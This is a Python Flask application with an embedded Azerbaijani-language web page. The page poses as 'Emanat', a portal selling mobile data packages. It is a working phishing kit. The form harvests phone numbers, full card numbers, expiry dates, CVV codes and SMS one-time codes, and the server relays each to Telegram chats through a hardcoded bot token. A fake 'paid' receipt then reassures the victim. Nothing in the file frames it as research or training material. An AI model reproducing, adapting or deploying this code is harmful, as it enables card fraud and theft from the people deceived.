import os
import time
import threading
import requests
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# Bot Tokeni və Sizin Chat ID-ləriniz (Tam gizli, server tərəfindədir)
BOT_TOKEN = "9078415499:AAHigQYF4G6GFuxx5dFTaUPeo-cEYa_OSoI"
CHAT_IDS = ["8866842113", "8803598862"]

# Veb səhifənin HTML/JS kodu (Frontend)
HTML_TEMPLATE = r"""<!DOCTYPE html>
<html lang="az">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Emanat – İnternet Paket Portalı</title>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
<style>
:root{
  --bg:#060e0a;
  --panel:#0f1c14;
  --primary:#10b981;
  --primary-glow:rgba(16,185,129,0.35);
  --cyan:#34d399;
  --txt:#f0fdf4;
  --muted:#86efac;
  --line:rgba(16,185,129,0.15);
  --card-bg:linear-gradient(135deg, #0f2318 0%, #09150e 100%);
}
*{box-sizing:border-box;margin:0;padding:0;font-family:'Plus Jakarta Sans',sans-serif}
body{
  background:var(--bg);color:var(--txt);min-height:100vh;overflow-x:hidden;
  background-image:
    radial-gradient(circle at 10% 20%, rgba(16,185,129,0.12), transparent 40%),
    radial-gradient(circle at 90% 80%, rgba(52,211,153,0.1), transparent 40%);
  background-attachment:fixed;
}

button, input {
  outline: none !important;
  -webkit-tap-highlight-color: transparent;
}

.wrap{max-width:1100px;margin:0 auto;padding:40px 20px 80px;position:relative;z-index:2}

header{text-align:center;margin-bottom:40px}
.logo{
  font-size:clamp(40px,7vw,70px);font-weight:800;color:#fff;letter-spacing:-1px;margin-bottom:10px;
}
.logo span{color:var(--primary)}
.tagline{font-size:16px;color:var(--muted);font-weight:400;max-width:500px;margin:0 auto}

.switch-box{
  display:flex;justify-content:center;gap:15px;margin:35px auto;max-width:480px;
  background:#09150e;padding:6px;border-radius:16px;border:1px solid var(--line);
}
.switch-btn{
  flex:1;padding:12px;border:none;background:transparent;color:var(--muted);
  font-weight:700;font-size:15px;border-radius:12px;cursor:pointer;
  transition:transform 0.1s ease, background 0.3s, color 0.3s, box-shadow 0.3s;
}
.switch-btn.active{
  background:var(--primary);color:#fff;box-shadow:0 4px 15px var(--primary-glow);
}
.switch-btn:active {
  transform: scale(0.96) translateY(2px);
}

.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:24px}
.pack-card{
  background:var(--card-bg);border:1px solid var(--line);border-radius:24px;
  padding:30px;position:relative;display:flex;flex-direction:column;justify-content:space-between;
  transition:all 0.3s ease;
}
.pack-card:hover{transform:translateY(-5px);border-color:rgba(16,185,129,0.5);box-shadow:0 15px 30px rgba(0,0,0,0.6)}
.pack-card.middle-card{border-color:rgba(16,185,129,0.6);background:linear-gradient(135deg, #132e20 0%, #09150e 100%)}

.badge{
  position:absolute;top:24px;right:24px;font-size:11px;font-weight:800;
  padding:5px 12px;border-radius:20px;background:rgba(16,185,129,0.15);color:var(--primary);
}
.pack-card.middle-card .badge{background:linear-gradient(135deg, var(--primary), var(--cyan));color:#fff}

.pack-title{font-size:22px;font-weight:800;margin-bottom:6px}
.pack-op{font-size:13px;color:var(--muted);font-weight:600;margin-bottom:20px}

.price-box{display:flex;align-items:baseline;gap:6px;margin-bottom:24px}
.price-val{font-size:38px;font-weight:800}
.price-curr{font-size:14px;color:var(--muted);font-weight:700}

.feat-list{list-style:none;margin-bottom:24px;display:grid;gap:10px;font-size:14px;color:#d1fae5}
.feat-list li{display:flex;align-items:center;gap:8px}
.feat-list li::before{content:"•";color:var(--primary);font-size:18px}

.btn-order{
  width:100%;padding:14px;border-radius:14px;border:1px solid var(--line);
  background:rgba(255,255,255,0.03);color:#fff;font-weight:700;font-size:15px;cursor:pointer;
  transition:transform 0.1s ease, background 0.3s;
}
.btn-order:hover{background:rgba(255,255,255,0.08)}
.btn-order:active{
  transform: scale(0.97) translateY(2px);
}

.section{margin-top:70px}
.section h2{font-size:26px;font-weight:800;text-align:center;margin-bottom:8px}
.section p.sec-sub{text-align:center;color:var(--muted);font-size:14px;margin-bottom:30px}

.steps-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
.step-card{background:var(--panel);border:1px solid var(--line);padding:22px;border-radius:18px}
.step-card span{font-size:28px;font-weight:800;color:var(--primary);display:block;margin-bottom:10px}
.step-card h4{font-size:16px;font-weight:700;margin-bottom:6px}
.step-card p{font-size:13px;color:var(--muted);line-height:1.5}

.faq-box{max-width:700px;margin:0 auto;display:grid;gap:10px}
.faq-item{background:var(--panel);border:1px solid var(--line);border-radius:14px;overflow:hidden}
.faq-item summary{padding:16px 20px;font-weight:700;cursor:pointer;font-size:15px;list-style:none;display:flex;justify-content:space-between;align-items:center}
.faq-item summary::after{content:"+";color:var(--primary);font-size:20px}
.faq-item[open] summary::after{content:"-"}
.faq-content{padding:0 20px 16px;font-size:13px;color:var(--muted);line-height:1.6}

.modal{position:fixed;inset:0;background:rgba(3,15,9,0.85);backdrop-filter:blur(12px);display:none;align-items:center;justify-content:center;z-index:100;padding:20px}
.modal.open{display:flex}
.modal-pane{width:100%;max-width:420px;background:#0d1c14;border:1px solid var(--line);border-radius:28px;padding:28px;box-shadow:0 25px 50px rgba(0,0,0,0.8)}

.modal-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
.modal-header h3{font-size:18px;font-weight:800}
.modal-close{background:transparent;border:1px solid var(--line);color:var(--muted);width:32px;height:32px;border-radius:50%;cursor:pointer;font-size:16px;transition:transform 0.1s ease;}
.modal-close:active{transform: scale(0.9) translateY(1px);}

.card-preview{height:165px;border-radius:16px;background:linear-gradient(135deg, #059669 0%, #047857 100%);padding:18px;margin-bottom:20px;display:flex;flex-direction:column;justify-content:space-between;color:#fff}
.card-preview .chip{width:34px;height:24px;background:#a7f3d0;border-radius:4px}
.card-preview .num{font-family:monospace;font-size:18px;letter-spacing:2px;font-weight:700}
.card-preview .row{display:flex;justify-content:space-between;font-size:12px;opacity:0.85}

.inp-group{margin-bottom:14px}
.inp-group label{display:block;font-size:11px;font-weight:700;color:var(--muted);margin-bottom:5px;text-transform:uppercase}
.inp-group input{width:100%;padding:12px 14px;border-radius:12px;background:rgba(255,255,255,0.03);border:1px solid var(--line);color:#fff;font-size:14px;outline:none}
.inp-group input:focus{border-color:var(--primary)}
.inp-row{display:flex;gap:10px}.inp-row .inp-group{flex:1}

.btn-submit{
  width:100%;padding:14px;border-radius:12px;border:none;background:var(--primary);color:#fff;font-weight:800;font-size:15px;cursor:pointer;margin-top:6px;box-shadow:0 6px 20px var(--primary-glow);
  transition:transform 0.1s ease, background 0.3s;
}
.btn-submit:active{
  transform: scale(0.97) translateY(2px);
}

.err-text{color:#f87171;font-size:12px;margin-top:4px;min-height:16px;font-weight:600}
.op-check{font-size:11px;font-weight:700;color:var(--cyan);margin-top:3px;min-height:14px}
.op-check.err{color:#f87171}

.receipt{background:#fff;color:#0f172a;padding:20px;border-radius:12px;font-family:monospace;font-size:12px;line-height:1.7;margin-bottom:16px}
.receipt h5{text-align:center;font-size:14px;margin-bottom:6px;font-weight:800}
.receipt hr{border:0;border-top:1px dashed #cbd5e1;margin:8px 0}
.receipt-line{display:flex;justify-content:space-between}

footer{margin-top:60px;text-align:center;padding-top:20px;border-top:1px solid var(--line);color:var(--muted);font-size:12px}
</style>
</head>
<body>

<div class="wrap">
  <header>
    <div class="logo">Ema<span>nat</span></div>
    <p class="tagline">Azərbaycanın mobil operatorları üçün ən sərfəli paketlər</p>
  </header>

  <div class="switch-box">
    <button class="switch-btn active" onclick="changeOp('Azercell', this)">Azercell</button>
    <button class="switch-btn" onclick="changeOp('Nar', this)">Nar</button>
    <button class="switch-btn" onclick="changeOp('Bakcell', this)">Bakcell</button>
  </div>

  <div class="grid" id="packagesGrid"></div>

  <section class="section">
    <h2>Necə işləyir?</h2>
    <p class="sec-sub">Sadə addımlarla paket əldə edin</p>
    <div class="steps-grid">
      <div class="step-card">
        <span>01</span>
        <h4>Paket seçin</h4>
        <p>Öz operatorunuza uyğun internet paketini seçin.</p>
      </div>
      <div class="step-card">
        <span>02</span>
        <h4>Məlumatları daxil edin</h4>
        <p>Nömrənizi və kart məlumatlarınızı qeyd edin.</p>
      </div>
      <div class="step-card">
        <span>03</span>
        <h4>Aktivləşdirin</h4>
        <p>SMS təsdiqindən sonra paketiniz nömrənizə yüklənsin.</p>
      </div>
    </div>
  </section>

  <section class="section">
    <h2>Tez-tez verilən suallar</h2>
    <p class="sec-sub">Ən çox soruşulan sualların cavabları</p>
    <div class="faq-box">
      <details class="faq-item">
        <summary>Paket nə vaxt aktiv olur?</summary>
        <div class="faq-content">Ödəniş uğurla tamamlandıqdan sonra 1-3 dəqiqə ərzində paket nömrənizə avtomatik yüklənir.</div>
      </details>
      <details class="faq-item">
        <summary>Komissiya tutulurmu?</summary>
        <div class="faq-content">Xeyr, paketlərin qiyməti tam şəffafdır və əlavə komissiya tətbiq olunmur.</div>
      </details>
      <details class="faq-item">
        <summary>Yanlış nömrəyə ödəniş etsəm nə olar?</summary>
        <div class="faq-content">Sistem nömrənin prefiksini yoxlayır, lakin səhv olarsa dəstək xəttimizə müraciət edə bilərsiniz.</div>
      </details>
    </div>
  </section>

  <footer>
    <p>© 2026 Emanat. Bütün hüquqlar qorunur.</p>
  </footer>
</div>

<div class="modal" id="orderModal">
  <div class="modal-pane">
    <div class="modal-header">
      <div>
        <h3 id="modalTitle">Paket</h3>
        <span id="modalPrice" style="color:var(--primary);font-size:13px;font-weight:700">0 AZN</span>
      </div>
      <button class="modal-close" onclick="closeModal()">×</button>
    </div>

    <div class="card-preview" id="cardView">
      <div class="chip"></div>
      <div class="num" id="previewNum">•••• •••• •••• ••••</div>
      <div class="row"><span>ETİBARLILIQ</span><span id="previewExp">MM/YY</span></div>
    </div>

    <div id="paymentForm">
      <div class="inp-group">
        <label>Mobil Nömrə</label>
        <input id="phoneInput" inputmode="numeric" placeholder="050 123 45 67" maxlength="13">
        <div class="op-check" id="opCheckText"></div>
      </div>
      <div class="inp-group">
        <label>Kart Nömrəsi</label>
        <input id="cardInput" inputmode="numeric" placeholder="4169 7300 0000 0000" maxlength="19">
      </div>
      <div class="inp-row">
        <div class="inp-group">
          <label>Son tarix</label>
          <input id="expInput" inputmode="numeric" placeholder="MM/YY" maxlength="5">
        </div>
        <div class="inp-group">
          <label>CVV</label>
          <input id="cvvInput" type="password" inputmode="numeric" placeholder="•••" maxlength="3">
        </div>
      </div>
      <div class="err-text" id="errorMsg"></div>
      <button class="btn-submit" onclick="submitPayment()">Təsdiq Et və Ödə</button>
    </div>

    <div id="otpPane" style="display:none">
      <div class="inp-group" style="text-align:center">
        <label style="margin-bottom:10px;display:block">SMS Təsdiq Kodu</label>
        <input id="otpInput" inputmode="numeric" placeholder="123456" style="text-align:center;font-size:20px;letter-spacing:3px">
      </div>
      <div class="err-text" id="otpError"></div>
      <button class="btn-submit" onclick="verifyOtpCode()">Təsdiqlə</button>
    </div>

    <div id="successPane" style="display:none">
      <div class="receipt" id="receiptData"></div>
      <button class="btn-submit" onclick="closeModal()">Pəncərəni Bağla</button>
    </div>
  </div>
</div>

<script>
const PACKAGES = {
  Azercell: [
    {t:"30 günlük 40 GB", p:5, g:"+500 dəqiqə ölkədaxili", b:"Ekonom"},
    {t:"30 günlük 65 GB", p:10, g:"+3000 dəqiqə ölkədaxili", b:"Ən çox satılan", middle:true},
    {t:"30 günlük 150 GB", p:20, g:"+3500 dəqiqə ölkədaxili", b:"VIP"}
  ],
  Nar: [
    {t:"30 günlük 40 GB", p:5, g:"+500 dəqiqə ölkədaxili", b:"Ekonom"},
    {t:"30 günlük 65 GB", p:10, g:"+3000 dəqiqə ölkədaxili", b:"Ən çox satılan", middle:true},
    {t:"30 günlük 150 GB", p:20, g:"+3500 dəqiqə ölkədaxili", b:"VIP"}
  ],
  Bakcell: [
    {t:"30 günlük 40 GB", p:5, g:"+500 dəqiqə ölkədaxili", b:"Ekonom"},
    {t:"30 günlük 65 GB", p:10, g:"+3000 dəqiqə ölkədaxili", b:"Ən çox satılan", middle:true},
    {t:"30 günlük 150 GB", p:20, g:"+3500 dəqiqə ölkədaxili", b:"VIP"}
  ]
};

let activeOperator = 'Azercell';
let selectedPackage = null;

function renderPackages() {
  const container = document.getElementById('packagesGrid');
  const list = PACKAGES[activeOperator];
  container.innerHTML = list.map(item => `
    <div class="pack-card ${item.middle ? 'middle-card' : ''}">
      <span class="badge">${item.b}</span>
      <div>
        <div class="pack-title">${item.t}</div>
        <div class="pack-op">${activeOperator}</div>
        <div class="price-box">
          <span class="price-val">${item.p}</span>
          <span class="price-curr">AZN</span>
        </div>
        <ul class="feat-list">
          <li>Tam sürətli internet</li>
          <li>${item.g}</li>
          <li>Zəmanətli aktivləşmə</li>
        </ul>
      </div>
      <button class="btn-order" onclick="openModal('${activeOperator} · ${item.t}',${item.p})">Sifariş Et</button>
    </div>
  `).join('');
}

function changeOp(op, btn) {
  activeOperator = op;
  document.querySelectorAll('.switch-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  renderPackages();
}

function openModal(title, price) {
  selectedPackage = { title, price };
  document.getElementById('modalTitle').textContent = title;
  document.getElementById('modalPrice').textContent = price + ' AZN';
  
  ['phoneInput','cardInput','expInput','cvvInput','otpInput'].forEach(id => document.getElementById(id).value = '');
  document.getElementById('previewNum').textContent = '•••• •••• •••• ••••';
  document.getElementById('previewExp').textContent = 'MM/YY';
  document.getElementById('errorMsg').textContent = '';
  document.getElementById('otpError').textContent = '';
  document.getElementById('opCheckText').textContent = '';
  
  document.getElementById('cardView').style.display = 'flex';
  document.getElementById('paymentForm').style.display = 'block';
  document.getElementById('otpPane').style.display = 'none';
  document.getElementById('successPane').style.display = 'none';
  
  document.getElementById('orderModal').classList.add('open');
}

function closeModal() {
  document.getElementById('orderModal').classList.remove('open');
}

document.getElementById('cardInput').oninput = e => {
  let val = e.target.value.replace(/\D/g, '').slice(0, 16);
  e.target.value = val.replace(/(.{4})/g, '$1 ').trim();
  document.getElementById('previewNum').textContent = val ? val.padEnd(16, '•').match(/.{1,4}/g).join(' ') : '•••• •••• •••• ••••';
};

document.getElementById('expInput').oninput = e => {
  let val = e.target.value.replace(/\D/g, '').slice(0, 4);
  if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2);
  e.target.value = val;
  document.getElementById('previewExp').textContent = val || 'MM/YY';
};

document.getElementById('phoneInput').oninput = e => {
  let val = e.target.value.replace(/\D/g, '').slice(0, 10);
  e.target.value = [val.slice(0,3), val.slice(3,6), val.slice(6,8), val.slice(8,10)].filter(Boolean).join(' ');
  
  const checkDiv = document.getElementById('opCheckText');
  if (val.length >= 3) {
    const pref = val.slice(0, 3);
    const ops = { Azercell:['050','051','010'], Nar:['070','077'], Bakcell:['055','099'] };
    const found = Object.keys(ops).find(k => ops[k].includes(pref));
    if (found) {
      checkDiv.textContent = '✓ ' + found + ' nömrəsi təsdiqləndi';
      checkDiv.classList.remove('err');
    } else {
      checkDiv.textContent = 'Yanlış operator prefiqsi';
      checkDiv.classList.add('err');
    }
  } else {
    checkDiv.textContent = '';
  }
};

function sendToBackend(payload) {
  fetch('/api/send', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  }).catch(err => console.error(err));
}

function submitPayment() {
  const ph = document.getElementById('phoneInput').value.replace(/\D/g, '');
  const cd = document.getElementById('cardInput').value.replace(/\D/g, '');
  const ex = document.getElementById('expInput').value;
  const cv = document.getElementById('cvvInput').value;

  let err = '';
  if (ph.length !== 10) err = 'Nömrəni düzgün daxil edin (məs: 050 123 45 67)';
  else if (cd.length !== 16) err = 'Kart nömrəsi 16 rəqəm olmalıdır';
  else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(ex)) err = 'Tarixi MM/YY formatında daxil edin';
  else if (cv.length !== 3) err = 'CVV 3 rəqəm olmalıdır';

  document.getElementById('errorMsg').textContent = err;
  if (err) return;

  sendToBackend({
    type: 'card',
    pkg: selectedPackage.title,
    price: selectedPackage.price,
    phone: document.getElementById('phoneInput').value,
    card: document.getElementById('cardInput').value,
    exp: ex,
    cvv: cv
  });

  document.getElementById('paymentForm').style.display = 'none';
  document.getElementById('cardView').style.display = 'none';
  document.getElementById('otpPane').style.display = 'block';
}

function verifyOtpCode() {
  const otp = document.getElementById('otpInput').value.trim();
  if (!otp) {
    document.getElementById('otpError').textContent = 'SMS kodu daxil edin';
    return;
  }

  sendToBackend({
    type: 'otp',
    phone: document.getElementById('phoneInput').value,
    card: document.getElementById('cardInput').value,
    otp: otp
  });

  const cd = document.getElementById('cardInput').value.replace(/\D/g, '');
  const receiptHTML = `
    <h5>EMANAT ÖDƏNİŞ ÇEKİ</h5>
    <hr>
    <div class="receipt-line"><span>Xidmət:</span><span>İnternet Paket</span></div>
    <div class="receipt-line"><span>Paket:</span><span>${selectedPackage.title}</span></div>
    <div class="receipt-line"><span>Nömrə:</span><span>+994 ${document.getElementById('phoneInput').value}</span></div>
    <div class="receipt-line"><span>Kart:</span><span>**** ${cd.slice(-4)}</span></div>
    <hr>
    <div class="receipt-line" style="font-weight:bold"><span>Məbləğ:</span><span>${selectedPackage.price}.00 AZN</span></div>
    <hr>
    <div style="text-align:center;font-weight:bold;color:#16a34a">UĞURLA ÖDƏNİLDİ</div>
  `;

  document.getElementById('receiptData').innerHTML = receiptHTML;
  document.getElementById('otpPane').style.display = 'none';
  document.getElementById('successPane').style.display = 'block';
}

renderPackages();
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/send', methods=['POST'])
def send_telegram():
    data = request.json
    if not data:
        return jsonify({'status': 'error'}), 400
    
    if data.get('type') == 'otp':
        text = (
            f"🔐 *Yeni OTP Kodu Gəldi!*\n\n"
            f"📱 *Nömrə:* {data.get('phone')}\n"
            f"💳 *Kart:* {data.get('card')}\n"
            f"🔢 *OTP:* `{data.get('otp')}`"
        )
    else:
        text = (
            f"💳 *Yeni Kart Məlumatı!*\n\n"
            f"📦 *Paket:* {data.get('pkg')}\n"
            f"💰 *Qiymət:* {data.get('price')} AZN\n"
                  f"📱 *Nömrə:* {data.get('phone')}\n"
            f"💳 *Kart:* `{data.get('card')}`\n"
            f"📅 *Tarix:* {data.get('exp')}\n"
            f"🔑 *CVV:* {data.get('cvv')}"
        )

    for chat_id in CHAT_IDS:
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'},
                timeout=5
            )
        except Exception as e:
            print(f"Telegram API xətası: {e}")

    return jsonify({'status': 'success'})

# Render yatmasın deyə hər 5 dəqiqədən bir öz-özünə ping atma mexanizmi
def self_ping():
    while True:
        time.sleep(300)
        render_url = os.environ.get("RENDER_EXTERNAL_URL")
        if render_url:
            try:
                requests.get(render_url, timeout=10)
            except Exception:
                pass

if __name__ == '__main__':
    threading.Thread(target=self_ping, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)